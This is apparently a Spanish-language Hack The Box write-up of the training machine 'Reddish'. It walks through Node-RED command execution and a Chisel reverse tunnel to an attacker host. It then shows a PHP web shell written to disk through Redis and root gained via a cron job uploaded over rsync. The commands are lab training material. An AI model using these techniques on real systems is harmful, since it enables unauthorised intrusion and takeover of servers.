
# 🖥️ Hack The Box - Reddish

**IP:** `10.10.10.94`  
**OS:** Linux (multi-container environment)  
**Dificultad:** Insane 
**Objetivo:** Obtener acceso root en un entorno multi-contenedor que incluye Redis, Node-RED y Rsync.

---

## 🧭 Enumeración Inicial
```bash
curl -s -X POST http://10.10.10.94:1880/
```
Devuelve una estructura de flujo que sugiere acceso a **Node-RED** con ejecución de comandos. Se carga una reverse shell mediante el flujo.

---

## 🐚 Acceso Inicial
- Se usa el flujo de Node-RED para ejecutar una reverse shell apuntando a nuestro listener.
- Dentro del contenedor, se observan dos interfaces de red: `172.18.0.2` y `172.19.0.4`.

---

## 🌐 Enumeración de la red
Se usa un script personalizado para escanear los rangos internos (172.18.0.0/16 y 172.19.0.0/16).  
Se detectan múltiples servicios accesibles:

- `172.19.0.2:6379` – Redis
- `172.19.0.3:80` – Web
- `172.19.0.4` – Node-RED (usado)

---

## 🔁 Port Forwarding con Chisel
```bash
# En atacante:
./chisel server --reverse -p 1234

# En víctima:
./chisel client <IP_ATACANTE>:1234 R:80:172.19.0.3:80 R:6379:172.19.0.2:6379
```

---

## 🧠 Redis Exploitation
Se puede usar Redis para escribir archivos directamente en el servidor web.
```bash
echo "<?php system($_REQUEST['cmd']) ?>" > cmd.php
cat cmd.php | redis-cli -h 127.0.0.1 -x set reverse
redis-cli config set dir /var/www/html/<ruta>
redis-cli config set dbfilename "cmd.php"
redis-cli save
```
Se obtiene ejecución remota de comandos por web:  
`http://<host>/cmd.php?cmd=id`

---

## 🛠 Reverse Shell desde backup
Se usa `socat` y una reverse shell Perl desde un endpoint vulnerable.

---

## 🧪 Rsync + Cron Exploit (Privesc)
Desde el contenedor web se detecta host `backup (172.20.0.2)` con Rsync.

```bash
# Creamos archivo cron:
echo '* * * * * root sh /tmp/reverse.sh' > reve
rsync reve rsync://backup:873/src/etc/cron.d
```

Se sube script con reverse shell:
```bash
rsync reverse.sh rsync://backup:873/src/tmp/reverse.sh
```

---

## 👑 Root Access
Al activarse el cron job, se recibe una shell como `root@backup`.

```bash
whoami
# root
```

---

## 🧾 Conclusiones
- Máquina interesante por su diseño multi-contenedor.
- Se combinan técnicas: RCE via Node-RED, explotación de Redis, port forwarding con Chisel, y escalada vía Rsync+cron.
- Refuerza conceptos de post-explotación en entornos internos aislados.

✅ ¡Rooted!
